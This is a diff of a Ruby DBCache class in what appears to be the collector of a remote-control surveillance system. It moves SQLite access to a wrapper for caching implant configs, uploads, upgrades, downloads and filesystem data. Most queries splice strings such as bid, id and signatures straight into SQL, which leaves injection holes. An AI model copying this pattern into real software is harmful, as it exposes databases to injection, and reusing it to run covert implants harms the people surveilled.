@@ -2,10 +2,10 @@
 #  Cache management for the db
 #
 
+require_relative 'sqlite'
+
 # from RCS::Common
 require 'rcs-common/trace'
-
-require_relative 'sqlite'
 
 module RCS
 module Collector
@@ -17,7 +17,7 @@ class DBCache
 
   def self.create!
     begin
-      db = SQLite3::Database.new CACHE_FILE
+      db = SQLite.open CACHE_FILE
     rescue Exception => e
       trace :error, "Problems creating the cache file: #{e.message}"
     end
@@ -60,12 +60,10 @@ class DBCache
   def self.length
     return 0 unless File.exist?(CACHE_FILE)
 
-    count = 0
     begin
-      db = SQLite3::Database.open CACHE_FILE
-      db.execute("SELECT COUNT(*) FROM factory_keys;") do |row|
-        count = row.first
-      end
+      db = SQLite.open CACHE_FILE
+      row = db.execute("SELECT COUNT(*) FROM factory_keys;")
+      count = row.first.first
       db.close
     rescue Exception => e
       trace :warn, "Cannot read the cache: #{e.message}"
@@ -83,7 +81,7 @@ class DBCache
     create! unless File.exist?(CACHE_FILE)
 
     begin
-      db = SQLite3::Database.open CACHE_FILE
+      db = SQLite.open CACHE_FILE
       db.execute("DELETE FROM agent_signature;")
       db.execute("INSERT INTO agent_signature VALUES ('#{sig}');")
       db.close
@@ -95,14 +93,10 @@ class DBCache
   def self.agent_signature
     return nil unless File.exist?(CACHE_FILE)
 
-    # default value
-    signature = nil
-
     begin
-      db = SQLite3::Database.open CACHE_FILE
-      db.execute("SELECT signature FROM agent_signature;") do |row|
-        signature = row.first
-      end
+      db = SQLite.open CACHE_FILE
+      row = db.execute("SELECT signature FROM agent_signature;")
+      signature = row.first.first
       db.close
     rescue Exception => e
       trace :warn, "Cannot read the cache: #{e.message}"
@@ -120,7 +114,7 @@ class DBCache
     create! unless File.exist?(CACHE_FILE)
 
     begin
-      db = SQLite3::Database.open CACHE_FILE
+      db = SQLite.open CACHE_FILE
       db.execute("DELETE FROM network_signature;")
       db.execute("INSERT INTO network_signature VALUES ('#{sig}');")
       db.close
@@ -132,14 +126,10 @@ class DBCache
   def self.network_signature
     return nil unless File.exist?(CACHE_FILE)
 
-    # default value
-    signature = nil
-
     begin
-      db = SQLite3::Database.open CACHE_FILE
-      db.execute("SELECT signature FROM network_signature;") do |row|
-        signature = row.first
-      end
+      db = SQLite.open CACHE_FILE
+      row = db.execute("SELECT signature FROM network_signature;")
+      signature = row.first.first
       db.close
     rescue Exception => e
       trace :warn, "Cannot read the cache: #{e.message}"
@@ -157,7 +147,7 @@ class DBCache
     create! unless File.exist?(CACHE_FILE)
 
     begin
-      db = SQLite3::Database.open CACHE_FILE
+      db = SQLite.open CACHE_FILE
       factory_keys.each_pair do |key, value|
         db.execute("INSERT INTO factory_keys VALUES ('#{key}','#{value}');")
       end
@@ -172,8 +162,9 @@ class DBCache
 
     factory_keys = {}
     begin
-      db = SQLite3::Database.open CACHE_FILE
-      db.execute("SELECT * FROM factory_keys;") do |row|
+      db = SQLite.open CACHE_FILE
+      rows = db.execute("SELECT * FROM factory_keys;")
+      rows.each do |row|
         factory_keys[row[0]] = row[1]
       end
       db.close
@@ -192,7 +183,7 @@ class DBCache
     return false unless File.exist?(CACHE_FILE)
 
     begin
-      db = SQLite3::Database.open CACHE_FILE
+      db = SQLite.open CACHE_FILE
       ret = db.execute("SELECT bid FROM configs WHERE bid = '#{bid}';")
       db.close
     rescue Exception => e
@@ -206,7 +197,7 @@ class DBCache
     return nil unless File.exist?(CACHE_FILE)
 
     begin
-      db = SQLite3::Database.open CACHE_FILE
+      db = SQLite.open CACHE_FILE
       ret = db.execute("SELECT config FROM configs WHERE bid = '#{bid}';")
       db.close
     rescue Exception => e
@@ -223,8 +214,8 @@ class DBCache
     create! unless File.exist?(CACHE_FILE)
     
     begin
-      db = SQLite3::Database.open CACHE_FILE
-      db.execute("INSERT INTO configs VALUES ('#{bid}', ? )", SQLite3::Blob.new(config))
+      db = SQLite.open CACHE_FILE
+      db.execute("INSERT INTO configs VALUES ('#{bid}', ? )", SQLite.blob(config))
       db.close
     rescue Exception => e
       trace :warn, "Cannot save the cache: #{e.message}"
@@ -235,7 +226,7 @@ class DBCache
     return unless File.exist?(CACHE_FILE)
 
     begin
-      db = SQLite3::Database.open CACHE_FILE
+      db = SQLite.open CACHE_FILE
       db.execute("DELETE FROM configs WHERE bid = '#{bid}';")
       db.close
     rescue Exception => e
@@ -251,7 +242,7 @@ class DBCache
     return false unless File.exist?(CACHE_FILE)
 
     begin
-      db = SQLite3::Database.open CACHE_FILE
+      db = SQLite.open CACHE_FILE
       ret = db.execute("SELECT uid FROM uploads WHERE bid = '#{bid}';")
       db.close
     rescue Exception => e
@@ -265,7 +256,7 @@ class DBCache
     return {}, 0 unless File.exist?(CACHE_FILE)
 
     begin
-      db = SQLite3::Database.open CACHE_FILE
+      db = SQLite.open CACHE_FILE
 
       # take just the first one
       # the others will be sent in later requests
@@ -294,10 +285,10 @@ class DBCache
     create! unless File.exist?(CACHE_FILE)
 
     begin
-      db = SQLite3::Database.open CACHE_FILE
+      db = SQLite.open CACHE_FILE
       uploads.each_pair do |key, value|
-        SQLite3::Database.safe_escape value[:filename]
-        db.execute("INSERT INTO uploads VALUES ('#{bid}', '#{key}', '#{value[:filename]}', ? )", SQLite3::Blob.new(value[:content]))
+        SQLite.safe_escape value[:filename]
+        db.execute("INSERT INTO uploads VALUES ('#{bid}', '#{key}', '#{value[:filename]}', ? )", SQLite.blob(value[:content]))
       end
       db.close
     rescue Exception => e
@@ -309,7 +300,7 @@ class DBCache
     return unless File.exist?(CACHE_FILE)
 
     begin
-      db = SQLite3::Database.open CACHE_FILE
+      db = SQLite.open CACHE_FILE
       db.execute("DELETE FROM uploads WHERE bid = '#{bid}' AND uid = '#{id}';")
       db.close
     rescue Exception => e
@@ -325,7 +316,7 @@ class DBCache
     return false unless File.exist?(CACHE_FILE)
 
     begin
-      db = SQLite3::Database.open CACHE_FILE
+      db = SQLite.open CACHE_FILE
       ret = db.execute("SELECT uid FROM upgrade WHERE bid = '#{bid}';")
       db.close
     rescue Exception => e
@@ -339,7 +330,7 @@ class DBCache
     return {}, 0 unless File.exist?(CACHE_FILE)
 
     begin
-      db = SQLite3::Database.open CACHE_FILE
+      db = SQLite.open CACHE_FILE
 
       # take just the first one
       # the others will be sent in later requests
@@ -368,9 +359,9 @@ class DBCache
     create! unless File.exist?(CACHE_FILE)
 
     begin
-      db = SQLite3::Database.open CACHE_FILE
+      db = SQLite.open CACHE_FILE
       upgrade.each_pair do |key, value|
-        db.execute("INSERT INTO upgrade VALUES ('#{bid}', '#{key}', '#{value[:filename]}', ? )", SQLite3::Blob.new(value[:content]))
+        db.execute("INSERT INTO upgrade VALUES ('#{bid}', '#{key}', '#{value[:filename]}', ? )", SQLite.blob(value[:content]))
       end
       db.close
     rescue Exception => e
@@ -382,7 +373,7 @@ class DBCache
     return unless File.exist?(CACHE_FILE)
 
     begin
-      db = SQLite3::Database.open CACHE_FILE
+      db = SQLite.open CACHE_FILE
       db.execute("DELETE FROM upgrade WHERE bid = '#{bid}' AND uid = '#{id}';")
       db.close
     rescue Exception => e
@@ -394,7 +385,7 @@ class DBCache
     return unless File.exist?(CACHE_FILE)
 
     begin
-      db = SQLite3::Database.open CACHE_FILE
+      db = SQLite.open CACHE_FILE
       db.execute("DELETE FROM upgrade WHERE bid = '#{bid}';")
       db.close
     rescue Exception => e
@@ -410,7 +401,7 @@ class DBCache
     return false unless File.exist?(CACHE_FILE)
 
     begin
-      db = SQLite3::Database.open CACHE_FILE
+      db = SQLite.open CACHE_FILE
       ret = db.execute("SELECT did FROM downloads WHERE bid = '#{bid}';")
       db.close
     rescue Exception => e
@@ -424,7 +415,7 @@ class DBCache
     return {} unless File.exist?(CACHE_FILE)
 
     begin
-      db = SQLite3::Database.open CACHE_FILE
+      db = SQLite.open CACHE_FILE
       ret = db.execute("SELECT did, filename FROM downloads WHERE bid = '#{bid}';")
       db.close
     rescue Exception => e
@@ -444,9 +435,9 @@ class DBCache
     create! unless File.exist?(CACHE_FILE)
 
     begin
-      db = SQLite3::Database.open CACHE_FILE
+      db = SQLite.open CACHE_FILE
       downloads.each_pair do |key, value|
-        SQLite3::Database.safe_escape value
+        SQLite.safe_escape value
         db.execute("INSERT INTO downloads VALUES ('#{bid}', '#{key}', '#{value}' )")
       end
       db.close
@@ -459,7 +450,7 @@ class DBCache
     return unless File.exist?(CACHE_FILE)
 
     begin
-      db = SQLite3::Database.open CACHE_FILE
+      db = SQLite.open CACHE_FILE
       db.execute("DELETE FROM downloads WHERE bid = '#{bid}';")
       db.close
     rescue Exception => e
@@ -475,7 +466,7 @@ class DBCache
     return false unless File.exist?(CACHE_FILE)
 
     begin
-      db = SQLite3::Database.open CACHE_FILE
+      db = SQLite.open CACHE_FILE
       ret = db.execute("SELECT fid FROM filesystems WHERE bid = '#{bid}';")
       db.close
     rescue Exception => e
@@ -489,7 +480,7 @@ class DBCache
     return {} unless File.exist?(CACHE_FILE)
 
     begin
-      db = SQLite3::Database.open CACHE_FILE
+      db = SQLite.open CACHE_FILE
       ret = db.execute("SELECT fid, depth, path FROM filesystems WHERE bid = '#{bid}';")
       db.close
     rescue Exception => e
@@ -509,9 +500,9 @@ class DBCache
     create! unless File.exist?(CACHE_FILE)
 
     begin
-      db = SQLite3::Database.open CACHE_FILE
+      db = SQLite.open CACHE_FILE
       filesystems.each_pair do |key, value|
-        SQLite3::Database.safe_escape value[:path]
+        SQLite.safe_escape value[:path]
         db.execute("INSERT INTO filesystems VALUES ('#{bid}', '#{key}', #{value[:depth]}, '#{value[:path]}' )")
       end
       db.close
@@ -524,7 +515,7 @@ class DBCache
     return unless File.exist?(CACHE_FILE)
 
     begin
-      db = SQLite3::Database.open CACHE_FILE
+      db = SQLite.open CACHE_FILE
       db.execute("DELETE FROM filesystems WHERE bid = '#{bid}';")
       db.close
     rescue Exception => e
